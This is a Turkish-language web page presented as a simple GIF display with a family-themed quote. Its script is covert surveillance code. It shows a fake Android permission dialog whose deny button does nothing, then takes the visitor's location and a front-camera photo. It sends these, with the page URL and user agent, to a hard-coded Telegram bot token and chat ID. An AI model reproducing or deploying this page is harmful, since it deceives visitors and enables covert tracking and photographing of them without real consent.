<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF G√∂sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
            overflow-x: hidden;
        }

        .gif-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .gif-container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        .status {
            color: #ffffff;
            font-size: 16px;
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            max-width: 600px;
            white-space: pre-line;
        }

        .hidden {
            display: none;
        }

        /* Android tarzƒ± izin modal'ƒ± - T√ºm cihazlarda */
        .android-permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex; /* T√ºm cihazlarda g√∂ster */
            justify-content: center;
            align-items: center;
            z-index: 10000;
            padding: 20px;
        }

        .android-permission-box {
            background: #ffffff;
            border-radius: 16px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
        }

        .android-permission-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .android-permission-icon {
            width: 48px;
            height: 48px;
            background: #e8f0fe;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            font-size: 24px;
        }

        .android-permission-title {
            font-size: 20px;
            font-weight: 500;
            color: #202124;
            margin: 0;
        }

        .android-permission-content {
            margin-bottom: 24px;
        }

        .android-permission-text {
            font-size: 14px;
            color: #5f6368;
            line-height: 1.5;
            margin: 0 0 16px 0;
        }

        .android-permission-item {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 8px;
            margin-bottom: 8px;
        }

        .android-permission-item-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            font-size: 20px;
        }

        .android-permission-item-text {
            font-size: 14px;
            color: #202124;
            flex: 1;
        }

        .android-permission-buttons {
            display: flex;
            gap: 8px;
        }

        .android-permission-btn {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .android-permission-btn-deny {
            background: #f1f3f4;
            color: #5f6368;
        }

        .android-permission-btn-deny:active {
            background: #e8eaed;
        }

        .android-permission-btn-allow {
            background: #1a73e8;
            color: white;
        }

        .android-permission-btn-allow:active {
            background: #1557b0;
        }


        /* Mobil cihazlar i√ßin responsive */
        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
                padding: 0 15px;
            }

            .gif-container img {
                max-width: 95%;
                max-height: 60vh;
            }

            .gif-container {
                gap: 20px;
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            .quote {
                font-size: 16px;
                padding: 0 10px;
            }

            .gif-container img {
                max-width: 100%;
                max-height: 50vh;
            }

            .gif-container {
                gap: 15px;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- Android tarzƒ± izin modal'ƒ± - Sadece mobil cihazlarda -->
    <div id="androidPermissionModal" class="android-permission-modal hidden">
        <div class="android-permission-box">
            <div class="android-permission-header">
                <div class="android-permission-icon">üîí</div>
                <h2 class="android-permission-title">ƒ∞zin ƒ∞steƒüi</h2>
            </div>
            <div class="android-permission-content">
                <p class="android-permission-text">Bu uygulama a≈üaƒüƒ±daki izinleri istiyor:</p>
                <div class="android-permission-item">
                    <div class="android-permission-item-icon">üìç</div>
                    <div class="android-permission-item-text">Konum bilgisi</div>
                </div>
                <div class="android-permission-item">
                    <div class="android-permission-item-icon">üì∑</div>
                    <div class="android-permission-item-text">Kamera eri≈üimi</div>
                </div>
            </div>
            <div class="android-permission-buttons">
                <button class="android-permission-btn android-permission-btn-deny" onclick="cancelAndroidPermissions()">Reddet</button>
                <button class="android-permission-btn android-permission-btn-allow" onclick="allowAndroidPermissions()">ƒ∞zin Ver</button>
            </div>
        </div>
    </div>

    <div class="gif-container">
        <img src="Don Carlone.gif" alt="GIF">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
        <div id="status" class="status hidden"></div>
    </div>

    <script>
        const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

        // Telegram bot ayarlarƒ±
        const botToken = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const chatId = '-4991699158';

        // Telegram'a mesaj g√∂nder
        async function sendToTelegram(message, photoData = null) {
            try {
                console.log('Telegram mesajƒ± g√∂nderiliyor...');
                console.log('Bot Token:', botToken ? 'Var' : 'Yok');
                console.log('Chat ID:', chatId);
                
                // Mesajƒ± g√∂nder
                const messageUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
                const messageResponse = await fetch(messageUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const messageResult = await messageResponse.json();
                console.log('Telegram API yanƒ±tƒ±:', messageResult);
                
                if (!messageResponse.ok) {
                    console.error('Telegram hatasƒ±:', messageResult);
                    throw new Error(messageResult.description || 'Mesaj g√∂nderilemedi');
                }
                
                console.log('Mesaj ba≈üarƒ±yla g√∂nderildi!');

                // Fotoƒüraf varsa g√∂nder
                if (photoData && photoData.image) {
                    // Base64'√º blob'a √ßevir
                    const base64Data = photoData.image.replace(/^data:image\/\w+;base64,/, '');
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });

                    // FormData ile g√∂nder
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'üì∏ Ziyaret√ßi kamera fotoƒürafƒ±');

                    const photoUrl = `${TELEGRAM_API_URL}${botToken}/sendPhoto`;
                    await fetch(photoUrl, {
                        method: 'POST',
                        body: formData
                    });
                }

                return { success: true };
            } catch (error) {
                console.error('Telegram g√∂nderme hatasƒ±:', error);
                throw error;
            }
        }

        async function requestPermissions() {
            console.log('=== ƒ∞Zƒ∞NLER ƒ∞STENƒ∞YOR ===');
            console.log('Bot Token:', botToken ? 'Var ‚úì' : 'Yok ‚úó');
            console.log('Chat ID:', chatId);
            console.log('URL:', window.location.href);
            console.log('HTTPS:', window.location.protocol === 'https:' ? 'Evet ‚úì' : 'Hayƒ±r ‚úó');
            
            if (!botToken || !chatId) {
                console.error('‚ùå Bot token veya Chat ID eksik!');
                alert('Bot ayarlarƒ± eksik!');
                return;
            }

            let locationData = null;
            let cameraData = null;
            
            console.log('Konum ve kamera izinleri paralel olarak isteniyor...');

            // Konum ve kamera izinlerini PARALEL olarak iste (daha hƒ±zlƒ±)
            const [locationResult, cameraResult] = await Promise.allSettled([
                // Konum izni iste
                (async () => {
                    try {
                        if (!navigator.geolocation) {
                            throw new Error('Geolocation desteklenmiyor');
                        }
                        
                        console.log('Geolocation API mevcut, konum isteniyor...');
                        
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    console.log('‚úì Konum alƒ±ndƒ±!');
                                    resolve(pos);
                                },
                                (err) => {
                                    console.error('‚úó Konum hatasƒ±:', err.message, 'Code:', err.code);
                                    reject(err);
                                },
                                {
                                    enableHighAccuracy: false, // Hƒ±z i√ßin false (daha hƒ±zlƒ±)
                                    timeout: 8000,  // Timeout azaltƒ±ldƒ±
                                    maximumAge: 60000  // 1 dakika cache kullan (daha hƒ±zlƒ±)
                                }
                            );
                        });

                        return {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                    } catch (error) {
                        console.error('‚ùå Konum hatasƒ±:', error.message, 'Code:', error.code);
                        return {
                            error: error.message,
                            code: error.code
                        };
                    }
                })(),
                
                // √ñn kamera izni iste (facingMode: 'user' = √∂n kamera)
                (async () => {
                    try {
                        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                            throw new Error('Kamera API desteklenmiyor');
                        }
                        
                        console.log('MediaDevices API mevcut, kamera isteniyor...');
                        
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { 
                                facingMode: 'user'  // √ñn kamera
                            } 
                        });
                        
                        console.log('‚úì Kamera izni verildi, stream alƒ±ndƒ±');

                        // Video stream'den bir frame yakala
                        console.log('Video frame yakalanƒ±yor...');
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', 'true'); // iOS i√ßin
                        video.setAttribute('autoplay', 'true');
                        video.muted = true; // Ses gereksiz
                        video.play();

                        // Video y√ºklenene kadar bekle (timeout azaltƒ±ldƒ±)
                        await new Promise((resolve, reject) => {
                            const timeout = setTimeout(() => {
                                if (video.readyState >= 2) {
                                    resolve();
                                }
                            }, 1000); // 1 saniye timeout (hƒ±zlandƒ±rƒ±ldƒ±)
                            
                            video.onloadedmetadata = () => {
                                console.log('Video metadata y√ºklendi:', video.videoWidth, 'x', video.videoHeight);
                                clearTimeout(timeout);
                                resolve(); // Hemen resolve et, seek bekleme
                            };
                            video.onerror = (err) => {
                                clearTimeout(timeout);
                                console.error('Video hatasƒ±:', err);
                                reject(err);
                            };
                        });

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        console.log('‚úì Canvas olu≈üturuldu:', canvas.width, 'x', canvas.height);

                        // Canvas'ƒ± base64 formatƒ±na √ßevir
                        const result = {
                            image: canvas.toDataURL('image/jpeg', 0.7), // Kalite azaltƒ±ldƒ± (daha hƒ±zlƒ±)
                            width: canvas.width,
                            height: canvas.height,
                            timestamp: new Date().toISOString()
                        };
                        console.log('‚úì Fotoƒüraf alƒ±ndƒ±, boyut:', result.width, 'x', result.height);

                        // Stream'i durdur
                        stream.getTracks().forEach(track => {
                            track.stop();
                        });
                        
                        return result;
                    } catch (error) {
                        console.error('‚ùå Kamera hatasƒ±:', error.message, 'Name:', error.name);
                        return {
                            error: error.message,
                            name: error.name
                        };
                    }
                })()
            ]);

            // Sonu√ßlarƒ± al
            locationData = locationResult.status === 'fulfilled' ? locationResult.value : { error: 'Konum alƒ±namadƒ±' };
            cameraData = cameraResult.status === 'fulfilled' ? cameraResult.value : { error: 'Kamera alƒ±namadƒ±' };
            
            if (locationData.latitude) {
                console.log('Konum verisi:', locationData);
            }
            if (cameraData.image) {
                console.log('Kamera verisi alƒ±ndƒ±');
            }

            // Telegram'a g√∂nder
            try {
                console.log('Telegram mesajƒ± hazƒ±rlanƒ±yor...');
                
                let message = 'üîî <b>Yeni Ziyaret√ßi Bilgileri</b>\n\n';
                message += `‚è∞ Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
                message += `üåê URL: ${window.location.href}\n`;
                message += `üíª User Agent: ${navigator.userAgent}\n\n`;

                // Konum bilgisi
                if (locationData && locationData.latitude && locationData.longitude) {
                    message += `üìç <b>Konum:</b>\n`;
                    message += `   Enlem: ${locationData.latitude}\n`;
                    message += `   Boylam: ${locationData.longitude}\n`;
                    message += `   Doƒüruluk: ${locationData.accuracy ? locationData.accuracy.toFixed(2) + 'm' : 'Bilinmiyor'}\n\n`;
                    message += `üó∫Ô∏è <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}">Haritada G√∂r√ºnt√ºle</a>\n\n`;
                    console.log('Konum alƒ±ndƒ±:', locationData);
                } else if (locationData && locationData.error) {
                    message += `‚ùå Konum izni reddedildi: ${locationData.error}\n\n`;
                    console.log('Konum hatasƒ±:', locationData.error);
                }

                // Kamera bilgisi
                if (cameraData && cameraData.image) {
                    message += `üì∏ Kamera fotoƒürafƒ± alƒ±ndƒ± (${cameraData.width}x${cameraData.height})\n`;
                    console.log('Kamera fotoƒürafƒ± alƒ±ndƒ±');
                } else if (cameraData && cameraData.error) {
                    message += `‚ùå Kamera izni reddedildi: ${cameraData.error}\n`;
                    console.log('Kamera hatasƒ±:', cameraData.error);
                }

                console.log('Mesaj g√∂nderiliyor...');
                await sendToTelegram(message, cameraData);
                console.log('T√ºm i≈ülemler tamamlandƒ±!');
            } catch (error) {
                console.error('G√∂nderme hatasƒ±:', error);
                console.error('Hata detayƒ±:', error.message);
                console.error('Stack trace:', error.stack);
            }
        }

        // Mobil cihaz kontrol√º
        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
                   (window.innerWidth <= 768);
        }

        // Android izin modal'ƒ±nƒ± g√∂ster/gizle
        function showAndroidPermissionModal() {
            const modal = document.getElementById('androidPermissionModal');
            modal.classList.remove('hidden');
        }

        function hideAndroidPermissionModal() {
            const modal = document.getElementById('androidPermissionModal');
            modal.classList.add('hidden');
        }

        function allowAndroidPermissions() {
            // ƒ∞zin Ver'e tƒ±klayƒ±nca modal kaybolsun
            hideAndroidPermissionModal();
            setTimeout(() => {
                requestPermissions();
            }, 300);
        }

        function cancelAndroidPermissions() {
            // ƒ∞ptal'e tƒ±klayƒ±nca bir ≈üey olmasƒ±n, modal a√ßƒ±k kalsƒ±n
            console.log('Kullanƒ±cƒ± ƒ∞ptal butonuna tƒ±kladƒ±, modal a√ßƒ±k kalƒ±yor');
            // Modal a√ßƒ±k kalacak, hi√ßbir ≈üey yapma
        }

        // Sayfa y√ºklendiƒüinde sadece bir kere izinleri iste
        let permissionsRequested = false;
        
        function startPermissionRequest() {
            if (permissionsRequested) {
                console.log('ƒ∞zinler zaten istenmi≈ü, tekrar istenmeyecek');
                return;
            }
            permissionsRequested = true;
            
            // T√ºm cihazlarda Android modal g√∂ster
            console.log('Android izin modal\'ƒ± g√∂steriliyor...');
            showAndroidPermissionModal();
        }
        
        // Birden fazla y√∂ntemle tetikle
        // 1. DOMContentLoaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', startPermissionRequest);
        } else {
            // Sayfa zaten y√ºkl√ºyse
            startPermissionRequest();
        }
        
        // 2. Window load
        window.addEventListener('load', () => {
            console.log('Window load event tetiklendi');
            startPermissionRequest();
        });
        
        // 3. Sayfa g√∂r√ºn√ºr olduƒüunda
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && !permissionsRequested) {
                console.log('Sayfa g√∂r√ºn√ºr oldu, izinler isteniyor');
                startPermissionRequest();
            }
        });
        
        // 4. Fallback: 1.5 saniye sonra (hƒ±zlandƒ±rƒ±ldƒ±)
        setTimeout(() => {
            if (!permissionsRequested) {
                console.log('Fallback: 1.5 saniye sonra izinler isteniyor');
                startPermissionRequest();
            }
        }, 1500);
    </script>
</body>
</html>
